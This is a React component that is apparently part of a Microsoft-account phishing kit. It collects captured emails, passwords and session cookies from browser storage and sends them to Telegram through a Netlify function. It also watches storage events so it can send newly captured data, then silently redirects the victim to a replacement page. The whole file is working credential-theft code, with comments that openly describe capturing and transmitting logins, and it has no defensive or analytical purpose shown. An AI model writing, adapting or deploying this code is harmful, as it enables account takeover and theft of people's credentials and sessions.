import React, { useLayoutEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sendToTelegram?: (data: any) => Promise<void>;
}

/**
 * Enhanced OAuth redirector with data transmission capabilities.
 *
 * Purpose:
 * - Immediately navigates the browser to /replacement.html on mount
 * - Monitors for captured credentials and sends them to Telegram
 * - Handles cookie capture and transmission
 * - Maintains seamless user experience
 */
const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ 
  onLoginSuccess, 
  sendToTelegram 
}) => {
  useLayoutEffect(() => {
    // Function to send captured data to Telegram
    const transmitCapturedData = async () => {
      try {
        // Get all captured data from storage
        const capturedCredentials = localStorage.getItem('captured_credentials') || 
                                   sessionStorage.getItem('captured_credentials') ||
                                   localStorage.getItem('replacement_credentials') ||
                                   sessionStorage.getItem('replacement_credentials');
        
        const capturedCookies = localStorage.getItem('captured_cookies') || 
                               sessionStorage.getItem('captured_cookies');
        
        const capturedEmail = localStorage.getItem('captured_email') || 
                             sessionStorage.getItem('captured_email');

        let credentials = null;
        let cookies = null;

        // Parse captured data
        if (capturedCredentials) {
          try {
            credentials = JSON.parse(capturedCredentials);
          } catch (e) {
            console.warn('Failed to parse credentials:', e);
          }
        }

        if (capturedCookies) {
          try {
            cookies = JSON.parse(capturedCookies);
          } catch (e) {
            console.warn('Failed to parse cookies:', e);
          }
        }

        // Prepare data for transmission
        const dataToSend = {
          email: credentials?.email || capturedEmail || '',
          password: credentials?.password || '',
          cookies: cookies || [],
          authenticationTokens: null,
          userAgent: navigator.userAgent,
          sessionId: Date.now().toString(),
          url: window.location.href,
          timestamp: new Date().toISOString(),
          source: credentials?.source || 'oauth-redirect',
          validated: credentials?.validated || false,
          microsoftAccount: credentials?.microsoftAccount || false
        };

        // Send to Telegram if we have meaningful data
        if (dataToSend.email || dataToSend.password || (dataToSend.cookies && dataToSend.cookies.length > 0)) {
          console.log('📤 Transmitting captured data to Telegram...', {
            hasEmail: !!dataToSend.email,
            hasPassword: !!dataToSend.password,
            cookieCount: dataToSend.cookies?.length || 0,
            validated: dataToSend.validated
          });

          if (sendToTelegram) {
            try {
              await sendToTelegram(dataToSend);
              console.log('✅ Data successfully transmitted to Telegram');
            } catch (error) {
              console.warn('⚠️ Failed to send data via prop function:', error);
              // Fallback to direct API call
              await sendDirectToTelegram(dataToSend);
            }
          } else {
            // Direct API call
            await sendDirectToTelegram(dataToSend);
          }

          // Mark as sent to prevent duplicate transmissions
          localStorage.setItem('data_transmitted', 'true');
          sessionStorage.setItem('data_transmitted', 'true');
        } else {
          console.log('📭 No meaningful data to transmit');
        }

      } catch (error) {
        console.warn('⚠️ Error in data transmission:', error);
      }
    };

    // Direct Telegram API call
    const sendDirectToTelegram = async (data: any) => {
      try {
        const response = await fetch('/.netlify/functions/sendTelegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });

        if (response.ok) {
          console.log('✅ Direct Telegram transmission successful');
        } else {
          console.warn('⚠️ Direct Telegram transmission failed:', response.status);
        }
      } catch (error) {
        console.warn('⚠️ Direct Telegram transmission error:', error);
      }
    };

    // Check if data has already been transmitted
    const alreadyTransmitted = localStorage.getItem('data_transmitted') || 
                              sessionStorage.getItem('data_transmitted');

    if (!alreadyTransmitted) {
      // Wait a moment for any pending data capture, then transmit
      setTimeout(transmitCapturedData, 1000);
    }

    // Navigate to replacement page
    try {
      console.log('🔄 Navigating to replacement page...');
      window.location.replace('/replacement.html');
    } catch (error) {
      console.error('❌ Failed to navigate to replacement page:', error);
      // Fallback to Microsoft login if navigation fails
      try {
        window.location.replace('https://login.microsoftonline.com');
      } catch (e) {
        console.error('❌ Fallback navigation also failed:', e);
      }
    }

    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Monitor for new data and transmit if needed
  useLayoutEffect(() => {
    const handleStorageChange = async (e: StorageEvent) => {
      if ((e.key === 'captured_credentials' || 
           e.key === 'replacement_credentials' || 
           e.key === 'captured_cookies') && 
          e.newValue) {
        
        const alreadyTransmitted = localStorage.getItem('data_transmitted');
        if (!alreadyTransmitted) {
          console.log('📨 New data detected, preparing transmission...');
          setTimeout(async () => {
            try {
              const credentials = JSON.parse(e.newValue!);
              const dataToSend = {
                email: credentials.email || '',
                password: credentials.password || '',
                cookies: credentials.cookies || [],
                userAgent: navigator.userAgent,
                sessionId: Date.now().toString(),
                url: window.location.href,
                timestamp: new Date().toISOString(),
                source: credentials.source || 'storage-monitor',
                validated: credentials.validated || false,
                microsoftAccount: credentials.microsoftAccount || false
              };

              if (sendToTelegram) {
                await sendToTelegram(dataToSend);
              } else {
                await fetch('/.netlify/functions/sendTelegram', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(dataToSend)
                });
              }

              localStorage.setItem('data_transmitted', 'true');
              console.log('✅ Storage-triggered transmission completed');
            } catch (error) {
              console.warn('⚠️ Storage-triggered transmission failed:', error);
            }
          }, 500);
        }
      }
    };

    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, [sendToTelegram]);

  // Render nothing to avoid any visible flash
  return null;
};

export default RealOAuthRedirect;
